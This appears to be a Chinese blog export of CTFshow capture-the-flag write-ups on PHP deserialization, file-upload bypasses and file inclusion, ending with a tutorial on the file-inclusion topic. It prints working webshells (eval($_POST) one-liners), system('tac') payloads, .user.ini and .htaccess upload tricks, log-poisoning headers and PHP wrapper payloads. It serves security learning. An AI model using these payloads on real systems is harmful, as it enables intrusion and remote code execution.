system(&#x27;tac /f*&#x27;);?&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>
<p>O:10:“ctfshowvip”:3:{s:8:“username”;s:7:“877.php”;s:8:“password”;s:26:“<?php system('tac /f*');?>”;s:4:“code”;N;}</p>
<p>访问877.php</p>
<p>ctfshow{ec5d5638-17ac-451e-9028-906e0746cc51}</p>
<h1>web262</h1>
<p>仔细看的话会发现一个message.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 15:13:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 15:17:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br></pre></td></tr></table></figure>
<p>Tzo3OiJtZXNzYWdlIjoxOntzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9</p>
<p>然后cookie=msg=Tzo3OiJtZXNzYWdlIjoxOntzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9</p>
<p>ctfshow{e1c8fc63-d209-4292-b449-682db6d888bb}</p>
<p>这还有一个字符串逃逸的知识点</p>
<p>我们填进去一个fuck就会被替换成loveU，字符多了1。但是我们序列化的东西还是识别四个字符…</p>
<p>O:7:“message”:4:{s:4:“from”;s:1:“1”;s:3:“msg”;s:1:“1”;s:2:“to”;s:1:“1”;s:5:“token”;s:5:“admin”;}</p>
<p>&quot;;s:5:“token”;s:5:“admin”;}		共27个字符</p>
<p>fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck</p>
<p>?f=1&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:“token”;s:5:“admin”;}</p>
<h1>web263</h1>
<p>待c</p>
<h1>web264</h1>
<p>O:7:“message”:4:{s:4:“from”;s:1:“1”;s:3:“msg”;s:1:“2”;s:2:“to”;s:1:“3”;s:5:“token”;s:5:“admin”;}</p>
<p>&quot;;s:5:“token”;s:5:“admin”;}27</p>
<p>fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck</p>
<p>?f=1&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:“token”;s:5:“admin”;}</p>
<p>?f=1&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:“token”;s:5:“admin”;}</p>
<p>在cookie里面添加一个msg，值随意</p>
<p><img src="image-20250205161026194.png" alt="image-20250205161026194"></p>
<p>ctfshow{21867c6d-45e3-4005-9f1b-a4be7fdb6683}</p>
<h1>web265</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-04 23:52:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>php当中的引用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$b</span> = &amp;<span class="variable">$a</span>; <span class="comment">// $b 是 $a 的引用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>; <span class="comment">// 输出 10</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>; <span class="comment">// 输出 10</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="number">20</span>; <span class="comment">// 修改 $a 的值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>; <span class="comment">// 输出 20，因为 $b 是 $a 的引用</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshowAdmin</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;token=&amp;<span class="variable">$a</span>-&gt;password;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:12:&quot;ctfshowAdmin&quot;:2:&#123;s:5:&quot;token&quot;;N;s:8:&quot;password&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure>
<p>ctfshow{1204ba0a-88e9-4675-92b9-9f153f3f0b52}</p>
<h1>web266</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-04 23:52:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一题要我们执行销毁函数，但是后面会有一个ctfshow字符串的过滤</p>
<p>过滤了<code>ctfshow</code>但是我这里用的是<code>cTFSHOW</code>，在PHP中，类不区分大小写；所以绕过了过滤。</p>
<p>O:7:“ctfsHow”:2:{s:8:“username”;s:6:“xxxxxx”;s:8:“password”;s:6:&quot;xxxxxx</p>
<p>$cs = file_get_contents(‘php://input’);好像是因为这个东西就不能用hackbar，只能用bp抓包</p>
<p><img src="image-20250205220706308.png" alt="image-20250205220706308"></p>
<p>ctfshow{c6ecc3df-b248-496b-a2be-6fa9cd83b68c}</p>
<h1>web267</h1>
<p>待c</p>
]]></content>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传</title>
    <url>/2025/02/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<h1>web151</h1>
<p>绕过前端检测</p>
<p><img src="image-20250128000124382.png" alt="image-20250128000124382"></p>
<p>lay-data=“{url: ‘upload.php’, accept: ‘images’,exts:‘png’}”</p>
<p>后面的png改为php即可上传php文件</p>
<p>php文件内容为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上传之后antsword连接</p>
<p>ctfshow{1b64824a-9dce-448c-b3ab-1a228b2976a4}</p>
<h1>web152</h1>
<p>我们还是要穿php文件，先把前端改了，然后bp抓包</p>
<p>把Content-Type后面的东西改成image/png</p>
<p>然后antsword连接</p>
<p>ctfshow{442b5262-0765-423f-8759-546621822503}</p>
<h1>web153</h1>
<p>使用.user.ini文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=/<span class="keyword">var</span>/www/html/upload/zmr.png</span><br></pre></td></tr></table></figure>
<p>然后上传zmr.png木马图片</p>
<p>antsword连接<a href="https://a3d88db1-0616-4d9e-aed7-e002209afe35.challenge.ctf.show/upload/">https://a3d88db1-0616-4d9e-aed7-e002209afe35.challenge.ctf.show/upload/</a></p>
<p>ctfshow{787f5258-2357-435f-a3cb-3d36ff826349}</p>
<h1>web154</h1>
<p>文件内容不合规,过滤了php关键词</p>
<p>把php换成=</p>
<p>ctfshow{6022d1f3-ecab-4424-9e61-c71c64c7bbaa}</p>
<h1>web155</h1>
<p>上题同理</p>
<p>ctfshow{c6337925-a6f3-4066-a910-ceb1951d6830}</p>
<h1>web156</h1>
<p><strong>过滤字符<code>[]</code>，<code>[]</code>可以可以使用<code>&#123;&#125;</code>代替。</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>&#123;<span class="string">&#x27;zmr&#x27;</span>&#125;);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ctfshow{e52c5580-89b6-4c3f-aef6-c46687c1b009}</p>
<h1>web157</h1>
<p>又过滤了{}和;</p>
<p><strong><code>&lt;?=system(&quot;tac ../f\*&quot;);?&gt;</code></strong></p>
<p>再传一遍.user.ini</p>
<p>直接拿flag</p>
<p>如果flag位置变了，直接修改sys内容</p>
<p>ctfshow{3f54cbb0-099f-4e95-9840-052316add8ee}</p>
<h1>web158</h1>
<p>上方方法</p>
<p>ctfshow{0525c3f0-1c13-4486-a14f-812740141737}</p>
<h1>web159</h1>
<p>先发一遍.user.ini</p>
<p>再改<?=`tac ../f*`?></p>
<p>ctfshow{e818ad09-0b23-445f-b73e-d6a6b8fdd4f0}</p>
<h1>web160</h1>
<p>这一题过滤了log关键词，我真服了，这tm过滤了log谁tm能过滤log啊？现实别人服务器会过滤这玩意？这纯tm只跟ctf有关好吗？</p>
<p>包含日志</p>
<p>1.png当中写</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&quot;/var/lo&quot;</span>.<span class="string">&quot;g/nginx/access.lo&quot;</span>.<span class="string">&quot;g&quot;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>.user.ini当作写</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=/<span class="keyword">var</span>/www/html/upload/<span class="number">1</span>.png</span><br></pre></td></tr></table></figure>
<p>进入/upload/</p>
<p>uset-agent:<?php @eval($_POST['zmr']);?></p>
<p>post传参</p>
<p>ctfshow{cfacbc38-ea29-4652-9085-7fcf66e12707}</p>
<h1>web161</h1>
<p>方法同上，只是在png文件前面加一个GIF89A</p>
<p>ctfshow{ecc6f79c-d50b-4662-805a-9efb1c61be22}</p>
<h1>web162-166</h1>
<p>涉及本地ip，不解释，自己wp</p>
<h1>web167</h1>
<p>服务器是apache</p>
<p>用.htaccess</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php.png</span><br></pre></td></tr></table></figure>
<p>将<code>.png</code>后缀的文件解析 <strong>成<code>php</code></strong></p>
<p>然后传zmr.jpg</p>
<?php
	@eval($_POST['zmr']);
?>
<p>ctfshow{5fdfdfe5-9048-45cf-a9c9-715a32cdf4a2}</p>
<h1>web168</h1>
<?=`tac ../flagaa.php`?>
<p>ctfshow{dae808c7-e828-4e5e-9821-2387a549c2e5}</p>
<p>wp说要啥免杀</p>
<h1>web169</h1>
]]></content>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含</title>
    <url>/2025/01/23/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<p>正式开始文件包含</p>
<p>从csdn了解一下，以下都为简洁信息，可作为背诵记忆，具体理解请访问原作者</p>
<h1><strong>文件包含知识点</strong></h1>
<h2 id="一、什么是文件包含漏洞">一、什么是文件包含漏洞</h2>
<p>文件包含漏洞是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。</p>
<p>以PHP为例,常用的文件包含函数有以下四种<br>
include(),require(),include_once(),require_once()</p>
<p>区别如下:</p>
<p>require():找不到被包含的文件会产生致命错误，并停止脚本运行<br>
include():找不到被包含的文件只会产生警告，脚本继续执行<br>
require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含<br>
include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</p>
<h2 id="二、本地文件包含漏洞-LFI">二、本地文件包含漏洞(LFI)</h2>
<p>能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞(LFI)</p>
<p>includ()</p>
<p>我们可以通过此函数读取本地的敏感信息</p>
<p>括号当中可以放进去绝对路径，知识点这里举例的…/…/windows/system.ini</p>
<h2 id="三、LFI漏洞利用技巧">三、LFI漏洞利用技巧</h2>
<h3 id="1-配合文件上传使用">1.配合文件上传使用</h3>
<p>有时候我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。</p>
<p>由于本人了解过这里上传图片的知识，这里不再多加赘述个人理解</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&quot;w&quot;</span>), <span class="string">&#x27;&lt;?php eval($_POST[123]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这段代码的目的是创建一个 PHP Web Shell 文件。它的执行流程如下：</p>
<p>​	①**<code>fopen(&quot;shell.php&quot;, &quot;w&quot;)</code>**：</p>
<ul>
<li>该函数打开一个名为 <code>shell.php</code> 的文件进行写入。如果文件不存在，它会创建这个文件。</li>
<li><code>&quot;w&quot;</code> 参数表示以写模式打开文件。如果文件已经存在，则会清空文件内容并重新写入。</li>
</ul>
<p>​	②**<code>fwrite()</code>**：</p>
<ul>
<li><code>fwrite()</code> 函数将 <code>&lt;?php eval($_POST[123]);?&gt;</code> 这个字符串写入到 <code>shell.php</code> 文件中。</li>
<li><code>eval()</code> 是一个非常危险的 PHP 函数，它会执行其参数中的 PHP 代码。在这个例子中，<code>eval($_POST[123]);</code> 会执行通过 HTTP POST 请求中传入的名为 <code>123</code> 的参数所包含的 PHP 代码。</li>
</ul>
<p>找到路径之后可以用蚂剑连接或者url后面直接搞</p>
<h3 id="2-包含Apache日志文件">2.包含Apache日志文件</h3>
<p>有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。</p>
<p>日志的目录一般会变怎样查看日志的目录？需要读取服务器配置文件(httpd.conf,ngix.conf…)或者根据phpinfo();得知(在phpinfo里搜error_log如果后面的值为空，则为默认地址。（<strong>对于Apache，日志存放路径：/var/log/apache/access.log<br>
对于Ngnix，日志存放路径：/var/log/nginx/access.log 和 /var/log/nginx/error.log</strong> )</p>
<p>怎样看是Apache或者Ngix？在响应头的sever里</p>
<p>在用户发起请求时，服务器会将请求写入access.log，当发生错误时将错误写入error.log</p>
<h3 id="3-包含SESSION文件">3.包含SESSION文件</h3>
<p>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p>
<h3 id="4-包含临时文件">4.包含临时文件</h3>
<p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\windows\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。</p>
<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。</p>
<p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。</p>
<h2 id="四、远程文件包含-RFI">四、远程文件包含(RFI)</h2>
<p>如果PHP的配置选项<code>allow_url_include</code>、<code>allow_url_fopen</code>状态为ON的话，则<strong>include/require</strong>函数是可以加载远程文件的，这种漏洞被称为远程文件包含(RFI)</p>
<h2 id="五、PHP伪协议">五、PHP伪协议</h2>
<p>PHP内置了很多URL风格的封装协议，可用于类似fopen()、copy()、file_exists()和filesize()的文件系统函数</p>
<p>如表所示</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>file://</td>
<td>访问本地文件系统</td>
</tr>
<tr>
<td>http://</td>
<td>访问HTTP(s)网址</td>
</tr>
<tr>
<td>ftp://</td>
<td>访问FTP(s)URLs</td>
</tr>
<tr>
<td>php://</td>
<td>访问各个输出/输出流(I/O streams)</td>
</tr>
<tr>
<td>zlib://</td>
<td>压缩流</td>
</tr>
<tr>
<td>data://</td>
<td>数据(RFC 2397)</td>
</tr>
<tr>
<td>glob://</td>
<td>查找匹配的文件路径模式</td>
</tr>
</tbody>
</table>
<h3 id="1-file-协议">1.file://协议</h3>
<p><strong>file://</strong> 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响</p>
<p><strong>file:// [文件的绝对路径和文件名]</strong></p>
<h3 id="2-php-协议">2.php://协议</h3>
<p>php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input<br>
php://filter用于读取源码。<br>
php://input用于执行php代码。</p>
<p>php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。<br>
<strong>php://input</strong> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</p>
<h3 id="3-ZIP-协议">3.ZIP://协议</h3>
<p><strong>zip://</strong> 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</p>
<h3 id="4-data-协议">4.data://协议</h3>
<p>data:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。</p>
<p>利用data:// 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data://text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">//如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入：</span><br><span class="line">data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="5-伪协议利用条件">5.伪协议利用条件</h3>
<table>
<thead>
<tr>
<th>协议</th>
<th>测试 PHP 版本</th>
<th>allow_url_fopen</th>
<th style="text-align:center">allow_url_include</th>
<th>用法</th>
</tr>
</thead>
<tbody>
<tr>
<td>file://</td>
<td>&gt;=5.2</td>
<td>off/on</td>
<td style="text-align:center">off/on</td>
<td>?file=file://D:/soft/phpStudy/WWW/phpcode.txt</td>
</tr>
<tr>
<td>php://filter</td>
<td>&gt;=5.2</td>
<td>off/on</td>
<td style="text-align:center">off/on</td>
<td>?file=php://filter/read=convert.base64 - encode/resource=./index.php</td>
</tr>
<tr>
<td>php://input</td>
<td>&gt;=5.2</td>
<td>on</td>
<td style="text-align:center">on</td>
<td>?file=php://input 【POST DATA】</td>
</tr>
<tr>
<td>zip://</td>
<td>&gt;=5.2</td>
<td>off/on</td>
<td style="text-align:center">off/on</td>
<td>?file=zip://D:/soft/phpStudy/WWW/file.zip%23phpcode.txt</td>
</tr>
<tr>
<td>compress.bzip2://</td>
<td>&gt;=5.2</td>
<td>off/on</td>
<td style="text-align:center">off/on</td>
<td>?file=compress.bzip2://D:/soft/phpStudy/WWW/file.bz2 【or】 ?file=compress.bzip2://./file.bz2</td>
</tr>
<tr>
<td>compress.zlib://</td>
<td>&gt;=5.2</td>
<td>off/on</td>
<td style="text-align:center">off/on</td>
<td>?file=compress.zlib://D:/soft/phpStudy/WWW/file.gz 【or】 ?file=compress.zlib://./file.gz</td>
</tr>
</tbody>
</table>
<h2 id="六、文件包含漏洞防护">六、文件包含漏洞防护</h2>
<p>1、使用str_replace等方法过滤掉危险字符</p>
<p>2、配置open_basedir，防止目录遍历（open_basedir 将php所能打开的文件限制在指定的目录树中）</p>
<p>3、php版本升级，防止%00截断</p>
<p>4、对上传的文件进行重命名，防止被读取</p>
<p>5、对于动态包含的文件可以设置一个白名单，不读取非白名单的文件。</p>
<p>6、做好管理员权限划分，做好文件的权限管理，allow_url_include和allow_url_fopen最小权限化<br>
————————————————</p>
<pre><code>版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。
</code></pre>
<p>原文链接：<a href="https://blog.csdn.net/m0_46467017/article/details/126380415">https://blog.csdn.net/m0_46467017/article/details/126380415</a></p>
<p>举一反三：</p>
<p><img src="image-20250122172011834.png" alt="image-20250122172011834"></p>
<p>通过这个知识点的介绍我们联想一下：在之前我们做题时，我们传进去</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
